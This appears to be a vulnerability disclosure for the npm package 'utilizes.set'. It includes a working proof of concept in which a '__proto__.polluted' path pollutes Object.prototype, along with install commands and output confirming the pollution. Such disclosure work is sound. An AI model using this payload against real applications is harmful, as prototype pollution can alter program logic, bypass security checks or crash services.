# Description

`utilizes.set` is vulnerable to `Prototype Pollution`.

# Proof of Concept

1. Create the following PoC file:

```
// poc.js
var utilizesSet = require("utilizes.set")
var obj = {}
console.log("Before : " + {}.polluted);
utilizesSet.set(obj,"Yes! Its Polluted","__proto__.polluted");
console.log("After : " + {}.polluted);
```

2. Execute the following commands in terminal:

```
npm i utilizes.set # Install affected module
node poc.js #  Run the PoC
```

3. Check the Output:
```
Before : undefined
After : Yes! Its Polluted
```
